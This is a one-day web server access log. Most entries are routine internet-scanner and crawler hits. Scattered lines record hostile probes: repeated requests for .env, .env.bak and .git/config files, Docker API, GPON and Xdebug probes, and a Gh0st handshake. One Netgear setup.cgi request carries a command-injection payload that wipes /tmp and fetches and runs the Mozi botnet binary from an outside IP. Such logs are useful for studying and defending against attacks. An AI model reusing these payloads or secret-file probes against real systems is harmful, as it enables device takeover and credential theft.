211.104.60.100 - - [12/Jan/2025:00:00:36 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
193.34.212.75 - - [12/Jan/2025:08:19:24 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
199.45.154.158 - - [12/Jan/2025:08:30:50 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
199.45.154.158 - - [12/Jan/2025:08:30:54 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.158 - - [12/Jan/2025:08:30:55 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.158 - - [12/Jan/2025:08:30:55 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.158 - - [12/Jan/2025:08:30:56 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
95.214.55.226 - - [12/Jan/2025:08:31:40 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.200.78.250 - - [12/Jan/2025:08:33:49 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
112.166.103.50 - - [12/Jan/2025:08:52:02 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.16.39.104 - - [12/Jan/2025:09:08:40 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
79.42.61.4 - - [12/Jan/2025:09:21:02 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.148 - - [12/Jan/2025:09:25:43 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [12/Jan/2025:09:25:43 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
91.223.3.201 - - [12/Jan/2025:09:42:36 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.94.145.70 - - [12/Jan/2025:09:44:23 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "P3P Validator"
92.23.89.120 - - [12/Jan/2025:10:10:43 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [12/Jan/2025:10:12:40 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
80.82.77.202 - - [12/Jan/2025:10:26:36 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3880.4 Safari/537.36"
34.38.150.142 - - [12/Jan/2025:10:41:42 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
34.38.150.142 - - [12/Jan/2025:11:02:45 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
95.214.55.226 - - [12/Jan/2025:11:03:56 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
66.240.205.34 - - [12/Jan/2025:11:24:42 +0000] "Gh0st\xad" 400 524 "-" "-"
78.153.140.148 - - [12/Jan/2025:11:40:08 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [12/Jan/2025:11:40:08 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.242.226.10 - - [12/Jan/2025:12:08:01 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
172.206.142.80 - - [12/Jan/2025:12:31:49 +0000] "GET /portal/redlion HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
123.254.108.200 - - [12/Jan/2025:12:32:13 +0000] "HEAD / HTTP/1.1" 200 296 "-" "Python/3.8 aiohttp/3.9.5"
183.103.120.218 - - [12/Jan/2025:12:37:15 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
195.3.223.55 - - [12/Jan/2025:12:45:22 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.148 - - [12/Jan/2025:12:46:27 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [12/Jan/2025:12:46:27 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
118.37.32.31 - - [12/Jan/2025:12:49:39 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
122.97.137.226 - - [12/Jan/2025:13:01:34 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://102.33.25.56:37206/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 302 350 "-" "-"
139.59.101.104 - - [12/Jan/2025:13:02:47 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
35.203.211.108 - - [12/Jan/2025:13:18:43 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
46.19.138.234 - - [12/Jan/2025:13:44:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
192.155.90.220 - - [12/Jan/2025:13:45:11 +0000] "\x16\x03\x01" 400 524 "-" "-"
193.34.212.75 - - [12/Jan/2025:13:56:58 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.200.78.250 - - [12/Jan/2025:14:01:37 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.174.93.12 - - [12/Jan/2025:14:09:59 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/80.0.180 Chrome/74.0.3729.180 Safari/537.36"
95.214.55.226 - - [12/Jan/2025:14:26:47 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.16.39.104 - - [12/Jan/2025:14:36:52 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
78.153.140.148 - - [12/Jan/2025:14:58:54 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [12/Jan/2025:14:58:54 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.196.220.253 - - [12/Jan/2025:15:05:13 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
165.154.51.90 - - [12/Jan/2025:15:41:09 +0000] "GET / HTTP/1.1" 200 1742 "-" "curl/7.29.0"
165.154.51.90 - - [12/Jan/2025:15:41:10 +0000] "\x16\x03\x01" 400 524 "-" "-"
165.154.51.90 - - [12/Jan/2025:15:41:11 +0000] "t3 12.1.2\n" 400 524 "-" "-"
193.200.78.250 - - [12/Jan/2025:15:44:36 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
139.59.101.104 - - [12/Jan/2025:15:44:44 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
45.79.181.94 - - [12/Jan/2025:15:46:53 +0000] "\x16\x03\x01" 400 524 "-" "-"
165.154.172.72 - - [12/Jan/2025:15:53:50 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/542.48 (KHTML, like Gecko) Chrome/85.0.902 Safari/537.36"
165.154.172.72 - - [12/Jan/2025:15:53:50 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
165.154.172.72 - - [12/Jan/2025:15:53:51 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Go-http-client/1.1"
165.154.172.72 - - [12/Jan/2025:15:53:51 +0000] "GET /js/login.js HTTP/1.1" 200 885 "-" "Go-http-client/1.1"
165.154.172.72 - - [12/Jan/2025:15:53:51 +0000] "GET /js/brand.js HTTP/1.1" 200 533 "-" "Go-http-client/1.1"
165.154.172.72 - - [12/Jan/2025:15:53:51 +0000] "GET /sitemap.xml HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
165.154.172.72 - - [12/Jan/2025:15:53:51 +0000] "GET /robots.txt HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
165.154.172.72 - - [12/Jan/2025:15:53:52 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/robots.txt" "Go-http-client/1.1"
165.154.172.72 - - [12/Jan/2025:15:53:52 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/sitemap.xml" "Go-http-client/1.1"
87.120.115.34 - - [12/Jan/2025:15:54:31 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (ZZ; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0"
78.153.140.148 - - [12/Jan/2025:16:06:30 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [12/Jan/2025:16:06:30 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
91.223.3.201 - - [12/Jan/2025:16:07:18 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
2.57.122.161 - - [12/Jan/2025:16:22:27 +0000] "GET /3/3/3/3/3/3/3/3/3/3/3/3/3/3/3/3 HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
178.128.54.126 - - [12/Jan/2025:16:39:58 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
178.128.54.126 - - [12/Jan/2025:16:40:03 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
87.120.113.55 - - [12/Jan/2025:16:41:54 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
124.122.99.186 - - [12/Jan/2025:16:54:33 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.148 - - [12/Jan/2025:17:08:27 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [12/Jan/2025:17:08:27 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
165.154.202.146 - - [12/Jan/2025:17:11:38 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.34.212.75 - - [12/Jan/2025:17:34:08 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
68.46.168.177 - - [12/Jan/2025:17:38:16 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.148 - - [12/Jan/2025:18:19:31 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [12/Jan/2025:18:19:31 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.180.140.107 - - [12/Jan/2025:18:38:41 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
154.213.184.23 - - [12/Jan/2025:18:42:33 +0000] "CONNECT web.realsysadm.in:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
46.19.138.234 - - [12/Jan/2025:18:47:39 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
18.188.222.160 - - [12/Jan/2025:19:04:23 +0000] "\x16\x03\x01" 400 524 "-" "-"
18.188.222.160 - - [12/Jan/2025:19:04:38 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
114.187.10.144 - - [12/Jan/2025:19:38:59 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.148 - - [12/Jan/2025:19:42:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [12/Jan/2025:19:42:39 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
80.82.77.202 - - [12/Jan/2025:20:02:39 +0000] "\x16\x03\x02\x01o\x01" 400 524 "-" "-"
185.16.39.104 - - [12/Jan/2025:20:04:36 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
211.35.212.160 - - [12/Jan/2025:20:06:17 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
95.214.55.226 - - [12/Jan/2025:20:15:12 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
85.159.0.251 - - [12/Jan/2025:20:32:00 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
80.82.77.202 - - [12/Jan/2025:20:48:40 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; FreeBSD i386; rv:28.0) Gecko/20100101 Firefox/28.0 SeaMonkey/2.25"
78.153.140.148 - - [12/Jan/2025:20:53:55 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [12/Jan/2025:20:53:55 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
59.182.109.173 - - [12/Jan/2025:21:14:30 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 302 387 "-" "Hello, World"
198.235.24.224 - - [12/Jan/2025:21:16:17 +0000] "\x16\x03\x01" 400 524 "-" "-"
198.235.24.224 - - [12/Jan/2025:21:16:17 +0000] "\x16\x03\x01" 400 524 "-" "-"
87.120.127.198 - - [12/Jan/2025:21:17:40 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 9; moto g(6)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
193.34.212.75 - - [12/Jan/2025:21:18:29 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
162.142.125.197 - - [12/Jan/2025:21:25:22 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
162.142.125.197 - - [12/Jan/2025:21:25:27 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.197 - - [12/Jan/2025:21:25:29 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.197 - - [12/Jan/2025:21:25:31 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.197 - - [12/Jan/2025:21:25:31 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
45.148.10.242 - - [12/Jan/2025:21:31:50 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
91.223.3.201 - - [12/Jan/2025:22:07:01 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
122.116.24.161 - - [12/Jan/2025:22:13:15 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
125.162.221.127 - - [12/Jan/2025:22:19:07 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
198.235.24.23 - - [12/Jan/2025:22:26:37 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
78.153.140.148 - - [12/Jan/2025:23:01:38 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [12/Jan/2025:23:01:38 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
13.49.18.5 - - [12/Jan/2025:23:03:27 +0000] "GET /containers/json HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
13.49.18.5 - - [12/Jan/2025:23:03:27 +0000] "GET /version HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
13.49.18.5 - - [12/Jan/2025:23:03:28 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
13.49.18.5 - - [12/Jan/2025:23:03:28 +0000] "GET /.env.bak HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
13.49.18.5 - - [12/Jan/2025:23:03:28 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
13.49.18.5 - - [12/Jan/2025:23:03:31 +0000] "\x16\x03\x01" 400 524 "-" "-"
95.214.55.226 - - [12/Jan/2025:23:12:08 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
147.185.132.246 - - [12/Jan/2025:23:18:06 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
178.215.236.132 - - [12/Jan/2025:23:28:34 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 9; Pixel 3a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
14.51.28.132 - - [12/Jan/2025:23:36:55 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
162.142.125.197 - - [12/Jan/2025:23:39:39 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
162.142.125.197 - - [12/Jan/2025:23:39:45 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.197 - - [12/Jan/2025:23:39:45 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.197 - - [12/Jan/2025:23:39:52 +0000] "GET / HTTP/1.1" 200 966 "http://229.227.155.34.bc.googleusercontent.com/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.197 - - [12/Jan/2025:23:39:53 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
92.255.57.58 - - [12/Jan/2025:23:49:50 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.16.39.104 - - [12/Jan/2025:23:55:31 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
205.210.31.152 - - [12/Jan/2025:23:56:02 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
